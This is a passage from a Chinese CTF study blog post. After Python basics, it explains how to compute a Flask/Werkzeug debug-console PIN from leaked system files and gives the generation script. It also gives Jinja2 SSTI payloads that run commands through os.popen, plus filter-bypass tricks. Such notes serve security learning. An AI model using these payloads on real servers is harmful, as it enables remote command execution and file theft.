<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">差集：a-b<br>并集：a|b<br>交集：a<span class="hljs-built_in">&amp;</span>b<br>异或：a<span class="hljs-built_in">^</span>b，不同时存在的元素<br></code></pre></td></tr></table></figure>
<ul>
<li>字典：{‘key’:‘value’,xxx}</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;‘key’:‘value’,xxx&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:          <span class="hljs-comment">#这里i取的是key,访问value可以使用a[i]</span><br>    xxx<br></code></pre></td></tr></table></figure>
<h4 id="匿名函数及模块引用">匿名函数及模块引用</h4>
<ul>
<li>匿名函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">x=<span class="hljs-keyword">lambda</span> a,b:a+b<br><span class="hljs-built_in">print</span>(x(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure>
<ul>
<li>模块引用</li>
</ul>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">1. from test import add/*:<br>在当前py文件中加载test.py文件中的add函数或者所有函数，然后在当前py文件中可以直接使用add()<br>2. import test:<br>会优先在当前目录中找test.py，然后使用add函数必须用:test.add()<br></code></pre></td></tr></table></figure>
<ul>
<li>flask模块：</li>
</ul>
<p>前后端交互，负责提供http服务，类似与php 的  php-fpm  phpcgi ；</p>
<p>具有模板渲染的函数。</p>
<h4 id="flask开启调试">flask开启调试</h4>
<p>如果后台开启调试，则会存在<code>http://xxx/console</code>页面，输入PIN码即可获得控制台进而执行命令；</p>
<p>如果进一步<strong>存在文件读取</strong>后门，可计算出PIN码：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%需要public_bits和private_bits</span><br>public<span class="hljs-built_in">_</span>bits=[&#x27;username&#x27;,&#x27;flask.php（固定）&#x27;,&#x27;Flask（固定）&#x27;，&#x27;app.py运行路径&#x27;]<br>private<span class="hljs-built_in">_</span>bits=[&#x27;machine<span class="hljs-built_in">_</span>id&#x27;,&#x27;getnode&#x27;]<br><br><span class="hljs-comment">%在Linux系统下</span><br><span class="hljs-comment">%username获取：</span><br>读取/etc/passwd<br><span class="hljs-comment">%app.py运行路径获取：</span><br>运行报错会显示<br><br><span class="hljs-comment">%getnode获取：</span><br>读取/sys/class/net/eth0/address<br>整理：<br>e.g.s=&#x27;02:42:0a:00:01:74&#x27;<br>&gt;&gt;&gt; s=s.replace(&quot;:&quot;,&quot;&quot;)    //去掉冒号<br>&gt;&gt;&gt; print(int(s[1:],16))   //从第二个字符开始转为十进制<br><br><span class="hljs-comment">%machine_id获取：</span><br>读取/etc/machine-id或者/proc/sys/kernel/random/boot<span class="hljs-built_in">_</span>id；<br>读取/proc/self/cgroup，第一行，按/分割后读取第三个元素；<br>最后读取的两个字符串进行拼接<br></code></pre></td></tr></table></figure>
<p>获取上述信息后利用脚本得到PIN：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getPIN</span>(<span class="hljs-params">public_bits,private_bits</span>):<br>    rv = <span class="hljs-literal">None</span><br>    num = <span class="hljs-literal">None</span><br>    h = hashlib.sha1()<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(public_bits, private_bits):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>            bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        h.update(bit)<br>    h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>    cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br>    <span class="hljs-comment"># end up with the same value and generate out 9 digits</span><br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br>        num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br>    <span class="hljs-comment"># Format the pincode in groups of digits for easier remembering if</span><br>    <span class="hljs-comment"># we don&#x27;t have a result yet.</span><br>    <span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>                rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                    num[x : x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>                )<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            rv = num<br><br>    <span class="hljs-keyword">return</span> rv, cookie_name<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    public_bits=[<br>    <span class="hljs-string">&#x27;Administratorxx&#x27;</span>,<br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<br>    <span class="hljs-string">&#x27;D:\\Python\\Python310\\lib\\site-packages\\flask\\app.pyxx&#x27;</span><br>]<br><br>    private_bits=[<br>        <span class="hljs-string">&#x27;197975952026825xx&#x27;</span>,<span class="hljs-string">&#x27;5d744fd6-d3af-4dec-83f4-04043f200c3cxx&#x27;</span><br>    ]<br><br>    PIN = getPIN(public_bits,private_bits)<br>    <span class="hljs-built_in">print</span>(PIN)<br></code></pre></td></tr></table></figure>
<p>在<code>/console</code>页面输入PIN后可以执行python命令进行文件读取：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;<span class="hljs-keyword">import</span> sys<br>&gt;&gt;<span class="hljs-keyword">import</span> os<br>&gt;&gt;os.popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()<br>&gt;&gt;os.popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
<h3 id="ssti利用条件">ssti利用条件</h3>
<p><strong>渲染字符串可控</strong>，也就说模板的内容可控</p>
<p>我们通过模板 语法 相当于变相的执行了服务器上的python代码</p>
<p>渲染字符串可控通过以下函数：</p>
<p><strong>render_template</strong>     相当于 include 传入的时模板的名字，执行的时模板文件内的模板语法</p>
<p><strong>render_template_string</strong> 相当于 eval 执行传入的字符串，直接作为模板语法解析</p>
<p>验证是否存在（POC）:</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">1 &#123;&#123; 2*2 &#125;&#125;<br><br>2 &#123;&#123; config &#125;&#125;<br></code></pre></td></tr></table></figure>
<h3 id="ssti引用链">ssti引用链</h3>
<p>形式：<code>&#123;&#123;payload&#125;&#125;</code></p>
<h4 id="python魔术方法">python魔术方法</h4>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tex">1. <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>:拿到对象所属的类<br>   e.g. &quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>  =&gt; &lt;class &#x27;str&#x27;&gt;<br>   	    [].<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>  =&gt; &lt;class &#x27;list&#x27;&gt;<br><br>2. <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>:当前类的父类<br>   e.g. &quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>  =&gt; &lt;class &#x27;object&#x27;&gt;<br><br>3. <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>():获得该类的所有子类列表<br>   e.g. &quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>()  =&gt; <br>   需要找到os类并进行利用，使用下标，e.g. &quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>()[121]<br></code></pre></td></tr></table></figure>
<h4 id="利用链">利用链</h4>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&#123;&#123;&quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>()[121].<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>init<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
<h3 id="绕过过滤">绕过过滤</h3>
<h4 id="过滤">过滤<code>.</code></h4>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%转换为数组引用</span><br>e.g. &quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>转化为&quot;&quot;[&#x27;<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>&#x27;]<br></code></pre></td></tr></table></figure>
<h4 id="过滤-2">过滤<code>_</code></h4>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%定义变量，构造_</span><br>&#123;<span class="hljs-comment">% set a =(()|select|string|list).pop(24) %&#125;</span><br>测试：&#123;<span class="hljs-comment">% set a =(()|select|string|list).pop(24) %&#125; &#123;% print(a) %&#125;</span><br><span class="hljs-comment">%使用十六进制字符串进行绕过</span><br>&#123;&#123;  ()[&quot;<span class="hljs-keyword">\x</span>5f<span class="hljs-keyword">\x</span>5fclass<span class="hljs-keyword">\x</span>5f<span class="hljs-keyword">\x</span>5f&quot;]  &#125;&#125;<br></code></pre></td></tr></table></figure>
<h4 id="过滤-3">过滤<code>[]</code></h4>
<p>获取os类时的下标引用时受限</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>getitem<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>   可以把中括号换成小括号使用<br>e.g.&quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>().<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>getitem<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>(121)<br></code></pre></td></tr></table></figure>
<h4 id="过滤-4">过滤`</h4>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/" class="print-no-link">#Web</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Web</div>
      <div>https://rain00star.github.io/2024/12/03/Web/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>rainstar</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>December 3, 2024</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/12/03/algorithm-enhance/" title="algorithm_enhance">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">algorithm_enhance</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/12/01/git%E5%A4%9A%E4%BA%BA%E5%90%88%E4%BD%9C/" title="git多人合作">
                        <span class="hidden-mobile">git多人合作</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/snowflake.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
